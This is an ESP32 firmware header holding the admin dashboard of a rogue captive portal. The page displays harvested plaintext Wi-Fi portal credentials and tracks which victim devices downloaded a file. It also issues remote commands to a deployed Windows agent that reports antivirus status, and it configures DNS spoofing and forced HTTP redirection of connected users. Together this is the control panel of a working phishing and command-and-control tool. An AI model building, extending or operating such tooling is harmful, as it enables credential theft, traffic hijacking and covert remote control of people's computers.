/*
 * ============================================================================
 *  ESP32 Enterprise Captive Portal - Admin Dashboard Page
 *  Version: 2.0.0
 * ============================================================================
 */

#ifndef ADMIN_PAGE_H
#define ADMIN_PAGE_H

const char PAGE_ADMIN_DASHBOARD[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
.header{background:linear-gradient(135deg,#1e293b 0%,#334155 100%);padding:20px 24px;border-bottom:1px solid #334155;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
.header h1{font-size:20px;font-weight:600;color:#f8fafc}
.header-actions{display:flex;gap:10px}
.btn{padding:10px 18px;border:none;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.2s}
.btn-sm{padding:6px 12px;font-size:12px}
.btn-outline{background:transparent;border:1px solid #475569;color:#94a3b8}
.btn-outline:hover{background:#1e293b;border-color:#667eea;color:#667eea}
.btn-danger{background:#dc2626;color:white}
.btn-danger:hover{background:#b91c1c}
.btn-primary{background:#667eea;color:white}
.btn-primary:hover{background:#5a67d8}
.btn-success{background:#22c55e;color:white}
.btn-success:hover{background:#16a34a}
.main{padding:24px;max-width:1400px;margin:0 auto}
.tabs{display:flex;gap:4px;margin-bottom:24px;flex-wrap:wrap}
.tab{padding:12px 20px;background:#1e293b;border:1px solid #334155;border-radius:8px;color:#94a3b8;cursor:pointer;transition:all 0.2s}
.tab:hover{background:#334155;color:#f8fafc}
.tab.active{background:#667eea;border-color:#667eea;color:white}
.tab-content{display:none}
.tab-content.active{display:block}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:#1e293b;border-radius:12px;padding:20px;border:1px solid #334155}
.stat-card h3{font-size:12px;text-transform:uppercase;color:#64748b;margin-bottom:8px;letter-spacing:0.5px}
.stat-card .value{font-size:28px;font-weight:700;color:#f8fafc}
.stat-card.connected{border-color:#22c55e}
.stat-card.disconnected{border-color:#dc2626}
.section{background:#1e293b;border-radius:12px;border:1px solid #334155;margin-bottom:24px;overflow:hidden}
.section-header{padding:16px 20px;border-bottom:1px solid #334155;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
.section-header h2{font-size:16px;font-weight:600;color:#f8fafc}
.section-body{padding:20px}
.table-wrap{overflow-x:auto}
table{width:100%;border-collapse:collapse}
th,td{padding:14px 20px;text-align:left;border-bottom:1px solid #334155}
th{background:#0f172a;font-size:12px;text-transform:uppercase;color:#64748b;font-weight:600;letter-spacing:0.5px}
td{font-size:14px;color:#cbd5e1}
tr:hover{background:#334155}
.badge{display:inline-block;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:500}
.badge-windows{background:#0078d4;color:white}
.badge-iphone{background:#555;color:white}
.badge-android{background:#3ddc84;color:#000}
.badge-mac{background:#a2aaad;color:#000}
.badge-unknown{background:#475569;color:#94a3b8}
.badge-yes,.badge-connected{background:#22c55e;color:white}
.badge-no,.badge-disconnected{background:#64748b;color:white}
.badge-open{background:#f59e0b;color:#000}
.badge-secured{background:#3b82f6;color:white}
.empty{padding:40px;text-align:center;color:#64748b}
.cred-item{background:#0f172a;margin:8px;padding:12px 16px;border-radius:8px;border-left:3px solid #667eea}
.cred-item strong{color:#f8fafc}
.cred-item span{color:#94a3b8;font-size:13px}
.form-row{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
.form-group{flex:1;min-width:200px}
.form-group label{display:block;font-size:12px;color:#94a3b8;margin-bottom:6px;text-transform:uppercase}
.form-group input,.form-group select{width:100%;padding:12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#f8fafc;font-size:14px}
.form-group input:focus{outline:none;border-color:#667eea}
.toggle-wrap{display:flex;align-items:center;gap:12px}
.toggle{position:relative;width:50px;height:26px;background:#475569;border-radius:13px;cursor:pointer;transition:background 0.3s}
.toggle.active{background:#22c55e}
.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;background:white;border-radius:50%;transition:left 0.3s}
.toggle.active::after{left:27px}
.network-item{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:#0f172a;border-radius:8px;margin-bottom:8px;border:1px solid #334155}
.network-item:hover{border-color:#667eea}
.network-info{flex:1}
.network-name{font-weight:600;color:#f8fafc}
.network-details{font-size:12px;color:#64748b;margin-top:4px}
.signal{width:40px;text-align:center}
.signal-bar{display:inline-block;width:4px;margin:0 1px;background:#334155;border-radius:2px}
.signal-bar.active{background:#22c55e}
.dns-item{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:#0f172a;border-radius:8px;margin-bottom:8px;border-left:3px solid #667eea}
.dns-item .domain{font-weight:600;color:#f8fafc}
.dns-item .ip{color:#94a3b8;font-family:monospace}
.alert{padding:12px 16px;border-radius:8px;margin-bottom:16px}
.alert-success{background:#22c55e20;border:1px solid #22c55e;color:#22c55e}
.alert-error{background:#dc262620;border:1px solid #dc2626;color:#dc2626}
.alert-info{background:#3b82f620;border:1px solid #3b82f6;color:#3b82f6}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:1000;align-items:center;justify-content:center}
.modal.show{display:flex}
.modal-content{background:#1e293b;border-radius:12px;padding:24px;max-width:400px;width:90%;border:1px solid #334155}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
.modal-header h3{color:#f8fafc;font-size:18px}
.modal-close{background:none;border:none;color:#94a3b8;font-size:24px;cursor:pointer}
@media(max-width:768px){.header{padding:16px}.main{padding:16px}th,td{padding:10px 12px}.form-row{flex-direction:column}}
</style>
</head>
<body>
<div class="header">
<h1>Admin Dashboard</h1>
<div class="header-actions">
<a href="/admin/logout" class="btn btn-outline">Logout</a>
</div>
</div>
<div class="main">
<div class="tabs">
<div class="tab active" onclick="showTab('devices')">Devices</div>
<div class="tab" onclick="showTab('clients')">Clients</div>
<div class="tab" onclick="showTab('commands')">Commands</div>
<div class="tab" onclick="showTab('dns')">DNS Settings</div>
<div class="tab" onclick="showTab('wifi')">WiFi Connection</div>
<div class="tab" onclick="showTab('redirect')">Redirect</div>
</div>

<!-- DEVICES TAB -->
<div id="tab-devices" class="tab-content active">
<div class="stats">
<div class="stat-card"><h3>Total Devices</h3><div class="value" id="totalDevices">0</div></div>
<div class="stat-card"><h3>Windows</h3><div class="value" id="windowsCount">0</div></div>
<div class="stat-card"><h3>Mobile</h3><div class="value" id="mobileCount">0</div></div>
<div class="stat-card"><h3>Credentials</h3><div class="value" id="credsCount">0</div></div>
</div>
<div class="section">
<div class="section-header">
<h2>Connected Devices</h2>
<div><button class="btn btn-primary btn-sm" onclick="loadDevices()">Refresh</button>
<button class="btn btn-danger btn-sm" onclick="clearData()">Clear All</button></div>
</div>
<div class="table-wrap">
<table><thead><tr><th>IP Address</th><th>Device Type</th><th>File Downloaded</th><th>Last Seen</th></tr></thead>
<tbody id="devicesTable"><tr><td colspan="4" class="empty">Loading...</td></tr></tbody>
</table>
</div>
</div>
<div class="section">
<div class="section-header"><h2>Captured Credentials</h2></div>
<div id="credsList" class="empty">Loading...</div>
</div>
</div>

<!-- CLIENTS TAB -->
<div id="tab-clients" class="tab-content">
<div class="stats">
<div class="stat-card"><h3>Monitored Clients</h3><div class="value" id="clientsCount">0</div></div>
<div class="stat-card"><h3>Online</h3><div class="value" id="clientsOnline">0</div></div>
<div class="stat-card"><h3>Protected</h3><div class="value" id="clientsProtected">0</div></div>
<div class="stat-card"><h3>At Risk</h3><div class="value" id="clientsAtRisk">0</div></div>
</div>
<div class="section">
<div class="section-header">
<h2>Security Monitor Clients</h2>
<div><button class="btn btn-primary btn-sm" onclick="loadClients()">Refresh</button>
<button class="btn btn-danger btn-sm" onclick="clearClients()">Clear All</button></div>
</div>
<div class="section-body">
<p style="color:#94a3b8;margin-bottom:16px">Windows clients running the Security Monitor agent report their OS info and security status.</p>
<div id="clientsList"><div class="empty">No clients reporting yet. Deploy SecurityMonitor.exe to Windows machines.</div></div>
</div>
</div>
</div>

<!-- COMMANDS TAB -->
<div id="tab-commands" class="tab-content">
<div class="section">
<div class="section-header">
<h2>Remote Command Execution</h2>
<button class="btn btn-danger btn-sm" onclick="clearCommandResults()">Clear Results</button>
</div>
<div class="section-body">
<p style="color:#94a3b8;margin-bottom:16px">Send commands to connected agents. Allowed: ipconfig, netstat, systeminfo, tasklist, hostname, whoami, dir, ping, tracert, nslookup, arp, route, netsh, wmic, getmac</p>
<div class="form-row">
<div class="form-group"><label>Select Client</label>
<select id="cmdClient" style="width:100%;padding:12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#f8fafc">
<option value="">-- Select a client --</option>
</select>
</div>
<div class="form-group"><label>Command</label><input type="text" id="cmdInput" placeholder="ipconfig /all"></div>
<div class="form-group" style="flex:0;align-self:flex-end"><button class="btn btn-success" onclick="sendCommand()">Execute</button></div>
</div>
<div id="cmdStatus"></div>
</div>
</div>
<div class="section">
<div class="section-header"><h2>Command Results</h2><button class="btn btn-primary btn-sm" onclick="loadCommandResults()">Refresh</button></div>
<div class="section-body">
<div id="commandResults"><div class="empty">No command results yet</div></div>
</div>
</div>
</div>

<!-- DNS SETTINGS TAB -->
<div id="tab-dns" class="tab-content">
<div class="section">
<div class="section-header">
<h2>Custom DNS Mappings</h2>
<button class="btn btn-primary btn-sm" onclick="loadDnsMappings()">Refresh</button>
</div>
<div class="section-body">
<p style="color:#94a3b8;margin-bottom:16px">Map specific domains to custom IP addresses. Use *.domain.com for wildcard matching.</p>
<div class="form-row">
<div class="form-group"><label>Domain</label><input type="text" id="dnsDomain" placeholder="example.com or *.example.com"></div>
<div class="form-group"><label>IP Address</label><input type="text" id="dnsIp" placeholder="192.168.1.100"></div>
<div class="form-group" style="flex:0;align-self:flex-end"><button class="btn btn-success" onclick="addDnsMapping()">Add Mapping</button></div>
</div>
<div id="dnsStatus"></div>
<div id="dnsList"></div>
</div>
</div>
</div>

<!-- WIFI CONNECTION TAB -->
<div id="tab-wifi" class="tab-content">
<div class="stats">
<div class="stat-card" id="wifiStatusCard">
<h3>Internet Connection</h3>
<div class="value" id="wifiStatusText">Checking...</div>
</div>
<div class="stat-card"><h3>Connected SSID</h3><div class="value" id="wifiSsid" style="font-size:18px">-</div></div>
<div class="stat-card"><h3>IP Address</h3><div class="value" id="wifiIp" style="font-size:18px">-</div></div>
<div class="stat-card"><h3>Signal</h3><div class="value" id="wifiRssi">-</div></div>
</div>
<div class="section">
<div class="section-header">
<h2>Available Networks</h2>
<div><button class="btn btn-primary btn-sm" onclick="scanWifi()">Scan Networks</button>
<button class="btn btn-danger btn-sm" onclick="disconnectWifi()">Disconnect</button></div>
</div>
<div class="section-body">
<div id="wifiScanStatus"></div>
<div id="networksList"><div class="empty">Click "Scan Networks" to find available WiFi networks</div></div>
</div>
</div>
</div>

<!-- REDIRECT TAB -->
<div id="tab-redirect" class="tab-content">
<div class="section">
<div class="section-header"><h2>Request Redirection Enforcement</h2></div>
<div class="section-body">
<p style="color:#94a3b8;margin-bottom:20px">When enabled, all HTTP requests from connected devices will be redirected to the specified target domain or IP address.</p>
<div class="form-row">
<div class="form-group" style="flex:0">
<label>Enable Redirect</label>
<div class="toggle-wrap">
<div class="toggle" id="redirectToggle" onclick="toggleRedirect()"></div>
<span id="redirectStatus">Disabled</span>
</div>
</div>
</div>
<div class="form-row">
<div class="form-group">
<label>Redirect Target (Domain or IP)</label>
<input type="text" id="redirectTarget" placeholder="http://example.com or http://192.168.1.1">
</div>
<div class="form-group" style="flex:0;align-self:flex-end">
<button class="btn btn-primary" onclick="saveRedirectSettings()">Save Settings</button>
</div>
</div>
<div id="redirectSaveStatus"></div>
<div class="alert alert-info" style="margin-top:20px">
<strong>Note:</strong> The redirect target should be a full URL (e.g., http://example.com). This will redirect all captive portal requests to the specified destination.
</div>
</div>
</div>
</div>
</div>

<!-- WiFi Password Modal -->
<div class="modal" id="wifiModal">
<div class="modal-content">
<div class="modal-header">
<h3>Connect to Network</h3>
<button class="modal-close" onclick="closeWifiModal()">&times;</button>
</div>
<div class="form-group">
<label>Network</label>
<input type="text" id="modalSsid" readonly>
</div>
<div class="form-group" style="margin-top:12px">
<label>Password</label>
<input type="password" id="modalPassword" placeholder="Enter WiFi password">
</div>
<div id="modalStatus" style="margin-top:12px"></div>
<div style="margin-top:20px;display:flex;gap:12px">
<button class="btn btn-primary" onclick="connectToNetwork()" style="flex:1">Connect</button>
<button class="btn btn-outline" onclick="closeWifiModal()">Cancel</button>
</div>
</div>
</div>

<script>
var currentTab='devices';
function showTab(tab){
document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
document.querySelector('.tab[onclick*="'+tab+'"]').classList.add('active');
document.getElementById('tab-'+tab).classList.add('active');
currentTab=tab;
if(tab=='devices')loadDevices();
else if(tab=='clients')loadClients();
else if(tab=='commands'){loadClientsForCommands();loadCommandResults();}
else if(tab=='dns')loadDnsMappings();
else if(tab=='wifi'){loadWifiStatus();scanWifi();}
else if(tab=='redirect')loadRedirectSettings();
}

function loadDevices(){
fetch('/api/devices').then(r=>r.json()).then(d=>{
var win=0,mob=0;
d.forEach(x=>{if(x.typeCode==0)win++;else if(x.typeCode==1||x.typeCode==2)mob++;});
document.getElementById('totalDevices').textContent=d.length;
document.getElementById('windowsCount').textContent=win;
document.getElementById('mobileCount').textContent=mob;
var html='';
if(d.length==0)html='<tr><td colspan="4" class="empty">No devices recorded yet</td></tr>';
else d.forEach(x=>{
var badge='badge-unknown';
if(x.typeCode==0)badge='badge-windows';
else if(x.typeCode==1)badge='badge-iphone';
else if(x.typeCode==2)badge='badge-android';
else if(x.typeCode==3)badge='badge-mac';
html+='<tr><td>'+x.ip+'</td><td><span class="badge '+badge+'">'+x.type+'</span></td><td><span class="badge '+(x.fileDownloaded?'badge-yes':'badge-no')+'">'+(x.fileDownloaded?'Yes':'No')+'</span></td><td>'+formatTime(x.lastSeen)+'</td></tr>';
});
document.getElementById('devicesTable').innerHTML=html;
});
fetch('/api/credentials').then(r=>r.json()).then(d=>{
document.getElementById('credsCount').textContent=d.length;
var html='';
if(d.length==0)html='<div class="empty">No credentials captured yet</div>';
else d.forEach(x=>{
html+='<div class="cred-item"><strong>'+escHtml(x.username)+'</strong> : <strong>'+escHtml(x.password)+'</strong><br><span>'+x.device+' | '+x.ip+' | '+formatTime(x.timestamp)+'</span></div>';
});
document.getElementById('credsList').innerHTML=html;
});
}

function clearData(){if(confirm('Delete all data?'))fetch('/api/clear',{method:'POST'}).then(()=>loadDevices());}

function loadClients(){
fetch('/api/clients').then(r=>r.json()).then(d=>{
var online=0,protected=0,atRisk=0;
d.forEach(x=>{
if(x.status=='online')online++;
var hasSec=x.security&&x.security.length>0;
var hasActive=false;
if(hasSec){x.security.forEach(s=>{if(s.state=='Active'||s.state=='Running')hasActive=true;});}
if(hasActive)protected++;else atRisk++;
});
document.getElementById('clientsCount').textContent=d.length;
document.getElementById('clientsOnline').textContent=online;
document.getElementById('clientsProtected').textContent=protected;
document.getElementById('clientsAtRisk').textContent=atRisk;
var html='';
if(d.length==0)html='<div class="empty">No clients reporting yet. Deploy SecurityMonitor.exe to Windows machines.</div>';
else d.forEach(x=>{
var hasSec=x.security&&x.security.length>0;
var hasActive=false;
if(hasSec){x.security.forEach(s=>{if(s.state=='Active'||s.state=='Running')hasActive=true;});}
var statusBadge=hasActive?'badge-yes':'badge-no';
var statusText=hasActive?'Protected':'At Risk';
html+='<div class="client-card" style="background:#0f172a;border-radius:8px;padding:16px;margin-bottom:12px;border-left:3px solid '+(hasActive?'#22c55e':'#dc2626')+'">';
html+='<div style="display:flex;justify-content:space-between;align-items:start;flex-wrap:wrap;gap:12px">';
html+='<div style="flex:1;min-width:200px">';
html+='<div style="font-size:18px;font-weight:600;color:#f8fafc">'+escHtml(x.hostname)+'</div>';
html+='<div style="color:#94a3b8;font-size:13px;margin-top:4px">'+escHtml(x.ip)+' | '+escHtml(x.osVersion||x.osType)+' ('+escHtml(x.osArch)+')</div>';
html+='<div style="color:#64748b;font-size:12px;margin-top:2px">Build: '+escHtml(x.osBuild||'N/A')+' | Last seen: '+formatTime(x.lastSeen)+'</div>';
html+='</div>';
html+='<div style="display:flex;gap:8px;align-items:center">';
html+='<span class="badge '+statusBadge+'">'+statusText+'</span>';
html+='<button class="btn btn-danger btn-sm" onclick="deleteClient(\''+escHtml(x.hostname)+'\')">Remove</button>';
html+='</div></div>';
if(hasSec){
html+='<div style="margin-top:12px;padding-top:12px;border-top:1px solid #334155">';
html+='<div style="font-size:12px;color:#64748b;margin-bottom:8px;text-transform:uppercase">Security Products</div>';
html+='<div style="display:flex;flex-wrap:wrap;gap:8px">';
x.security.forEach(s=>{
var secBadge=s.state=='Active'||s.state=='Running'?'badge-yes':'badge-no';
html+='<span class="badge '+secBadge+'" style="font-size:11px">'+escHtml(s.name)+' ('+escHtml(s.type)+'): '+escHtml(s.state)+'</span>';
});
html+='</div></div>';
}else{
html+='<div style="margin-top:12px;padding-top:12px;border-top:1px solid #334155;color:#f59e0b;font-size:13px">⚠ No security products detected</div>';
}
html+='</div>';
});
document.getElementById('clientsList').innerHTML=html;
});
}

function deleteClient(hostname){
if(!confirm('Remove client '+hostname+'?'))return;
var fd=new FormData();fd.append('hostname',hostname);
fetch('/api/clients/delete',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
if(d.success)loadClients();
});
}

function clearClients(){
if(!confirm('Remove all monitored clients?'))return;
fetch('/api/clients/clear',{method:'POST'}).then(()=>loadClients());
}

function loadClientsForCommands(){
fetch('/api/clients').then(r=>r.json()).then(d=>{
var sel=document.getElementById('cmdClient');
sel.innerHTML='<option value="">-- Select a client --</option>';
d.forEach(x=>{
var clientId=x.clientId||x.hostname;
sel.innerHTML+='<option value="'+escHtml(clientId)+'">'+escHtml(x.hostname)+' ('+escHtml(x.ip)+')</option>';
});
});
}

function sendCommand(){
var clientId=document.getElementById('cmdClient').value;
var command=document.getElementById('cmdInput').value.trim();
if(!clientId){showStatus('cmdStatus','Please select a client','error');return;}
if(!command){showStatus('cmdStatus','Please enter a command','error');return;}
var fd=new FormData();fd.append('clientId',clientId);fd.append('command',command);
fetch('/api/send-command',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
if(d.success){
showStatus('cmdStatus','Command sent! Waiting for result...','success');
document.getElementById('cmdInput').value='';
setTimeout(loadCommandResults,3000);
}else{
showStatus('cmdStatus',d.message||'Failed to send command','error');
}
});
}

function loadCommandResults(){
fetch('/api/command-results').then(r=>r.json()).then(d=>{
var html='';
if(d.length==0)html='<div class="empty">No command results yet</div>';
else d.reverse().forEach(x=>{
html+='<div style="background:#0f172a;border-radius:8px;padding:16px;margin-bottom:12px;border-left:3px solid #667eea">';
html+='<div style="display:flex;justify-content:space-between;margin-bottom:8px">';
html+='<span style="color:#f8fafc;font-weight:600">'+escHtml(x.clientId)+'</span>';
html+='<span style="color:#64748b;font-size:12px">'+formatTime(x.timestamp)+'</span>';
html+='</div>';
html+='<pre style="background:#0f172a;color:#22c55e;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;margin:0;padding:12px;border:1px solid #334155;border-radius:4px">'+escHtml(x.result)+'</pre>';
html+='</div>';
});
document.getElementById('commandResults').innerHTML=html;
});
}

function clearCommandResults(){
if(!confirm('Clear all command results?'))return;
fetch('/api/command-results/clear',{method:'POST'}).then(()=>loadCommandResults());
}

function loadDnsMappings(){
fetch('/api/dns-mappings').then(r=>r.json()).then(d=>{
var html='';
if(d.length==0)html='<div class="empty">No DNS mappings configured</div>';
else d.forEach(x=>{
html+='<div class="dns-item"><div><span class="domain">'+escHtml(x.domain)+'</span> &rarr; <span class="ip">'+escHtml(x.ip)+'</span></div><button class="btn btn-danger btn-sm" onclick="deleteDns(\''+escHtml(x.domain)+'\')">Delete</button></div>';
});
document.getElementById('dnsList').innerHTML=html;
});
}

function addDnsMapping(){
var domain=document.getElementById('dnsDomain').value.trim();
var ip=document.getElementById('dnsIp').value.trim();
if(!domain||!ip){showStatus('dnsStatus','Please enter both domain and IP','error');return;}
var fd=new FormData();fd.append('domain',domain);fd.append('ip',ip);
fetch('/api/dns-mappings',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
if(d.success){showStatus('dnsStatus','DNS mapping added successfully','success');document.getElementById('dnsDomain').value='';document.getElementById('dnsIp').value='';loadDnsMappings();}
else showStatus('dnsStatus',d.message||'Failed to add mapping','error');
});
}

function deleteDns(domain){
if(!confirm('Delete mapping for '+domain+'?'))return;
var fd=new FormData();fd.append('domain',domain);
fetch('/api/dns-mappings/delete',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
if(d.success)loadDnsMappings();
});
}

function loadWifiStatus(){
fetch('/api/wifi/status').then(r=>r.json()).then(d=>{
var card=document.getElementById('wifiStatusCard');
var text=document.getElementById('wifiStatusText');
if(d.connected){
card.className='stat-card connected';
text.textContent='Connected';
document.getElementById('wifiSsid').textContent=d.ssid||'-';
document.getElementById('wifiIp').textContent=d.ip||'-';
document.getElementById('wifiRssi').textContent=d.rssi?d.rssi+' dBm':'-';
}else{
card.className='stat-card disconnected';
text.textContent='Disconnected';
document.getElementById('wifiSsid').textContent='-';
document.getElementById('wifiIp').textContent='-';
document.getElementById('wifiRssi').textContent='-';
}
});
}

var scanInterval=null;
function scanWifi(){
document.getElementById('wifiScanStatus').innerHTML='<div class="alert alert-info">Scanning for networks...</div>';
document.getElementById('networksList').innerHTML='<div class="empty">Scanning...</div>';
if(scanInterval)clearInterval(scanInterval);
fetch('/api/wifi/scan').then(r=>r.json()).then(handleScanResult);
scanInterval=setInterval(()=>{
fetch('/api/wifi/scan').then(r=>r.json()).then(d=>{
if(d.status!='scanning'){clearInterval(scanInterval);scanInterval=null;}
handleScanResult(d);
});
},2000);
}

function handleScanResult(d){
if(d.status=='scanning'){
document.getElementById('wifiScanStatus').innerHTML='<div class="alert alert-info">Scanning for networks...</div>';
return;
}
document.getElementById('wifiScanStatus').innerHTML='';
if(d.status=='failed'){
document.getElementById('networksList').innerHTML='<div class="empty">Scan failed. Try again.</div>';
return;
}
if(!d.networks||d.networks.length==0){
document.getElementById('networksList').innerHTML='<div class="empty">No networks found</div>';
return;
}
var html='';
d.networks.forEach(n=>{
var bars=getSignalBars(n.rssi);
html+='<div class="network-item" onclick="showWifiModal(\''+escHtml(n.ssid)+'\',\''+n.encryption+'\')"><div class="network-info"><div class="network-name">'+escHtml(n.ssid)+'</div><div class="network-details">Ch '+n.channel+' | '+n.rssi+' dBm | <span class="badge '+(n.encryption=='Open'?'badge-open':'badge-secured')+'">'+n.encryption+'</span></div></div><div class="signal">'+bars+'</div></div>';
});
document.getElementById('networksList').innerHTML=html;
}

function getSignalBars(rssi){
var level=rssi>-50?4:rssi>-60?3:rssi>-70?2:1;
var html='';
for(var i=1;i<=4;i++){
var h=i*4+4;
html+='<span class="signal-bar'+(i<=level?' active':'')+'" style="height:'+h+'px"></span>';
}
return html;
}

function showWifiModal(ssid,enc){
document.getElementById('modalSsid').value=ssid;
document.getElementById('modalPassword').value='';
document.getElementById('modalStatus').innerHTML='';
document.getElementById('wifiModal').classList.add('show');
if(enc=='Open')document.getElementById('modalPassword').placeholder='No password required';
else document.getElementById('modalPassword').placeholder='Enter WiFi password';
}

function closeWifiModal(){document.getElementById('wifiModal').classList.remove('show');}

function connectToNetwork(){
var ssid=document.getElementById('modalSsid').value;
var pass=document.getElementById('modalPassword').value;
document.getElementById('modalStatus').innerHTML='<div class="alert alert-info">Connecting...</div>';
var fd=new FormData();fd.append('ssid',ssid);fd.append('password',pass);
fetch('/api/wifi/connect',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
if(d.success){
document.getElementById('modalStatus').innerHTML='<div class="alert alert-success">Connected! IP: '+d.ip+'</div>';
setTimeout(()=>{closeWifiModal();loadWifiStatus();},1500);
}else{
document.getElementById('modalStatus').innerHTML='<div class="alert alert-error">'+(d.message||'Connection failed')+'</div>';
}
});
}

function disconnectWifi(){
if(!confirm('Disconnect from current network?'))return;
fetch('/api/wifi/disconnect',{method:'POST'}).then(()=>loadWifiStatus());
}

function loadRedirectSettings(){
fetch('/api/settings').then(r=>r.json()).then(d=>{
var toggle=document.getElementById('redirectToggle');
var status=document.getElementById('redirectStatus');
if(d.redirectEnabled){
toggle.classList.add('active');
status.textContent='Enabled';
}else{
toggle.classList.remove('active');
status.textContent='Disabled';
}
document.getElementById('redirectTarget').value=d.redirectTarget||'';
});
}

function toggleRedirect(){
var toggle=document.getElementById('redirectToggle');
var status=document.getElementById('redirectStatus');
toggle.classList.toggle('active');
status.textContent=toggle.classList.contains('active')?'Enabled':'Disabled';
}

function saveRedirectSettings(){
var enabled=document.getElementById('redirectToggle').classList.contains('active');
var target=document.getElementById('redirectTarget').value.trim();
var fd=new FormData();
fd.append('enabled',enabled?'true':'false');
fd.append('target',target);
fetch('/api/settings/redirect',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
if(d.success)showStatus('redirectSaveStatus','Settings saved successfully','success');
else showStatus('redirectSaveStatus',d.message||'Failed to save','error');
});
}

function showStatus(id,msg,type){
document.getElementById(id).innerHTML='<div class="alert alert-'+type+'">'+msg+'</div>';
setTimeout(()=>{document.getElementById(id).innerHTML='';},3000);
}

function formatTime(s){if(!s)return'N/A';var d=new Date(s*1000);return d.toLocaleString();}
function escHtml(t){var d=document.createElement('div');d.textContent=t;return d.innerHTML;}

loadDevices();
setInterval(()=>{if(currentTab=='devices')loadDevices();else if(currentTab=='clients')loadClients();},10000);
</script>
<footer style="text-align:center;padding:24px;color:#64748b;font-size:12px;border-top:1px solid #334155;margin-top:24px">
<p>&copy; 2026 Khaled M.Alshammri | <a href="https://github.com/ik0z" target="_blank" style="color:#667eea;text-decoration:none">@ik0z</a> . All rights reserved.</p>
</footer>
</body>
</html>
)rawliteral";

#endif
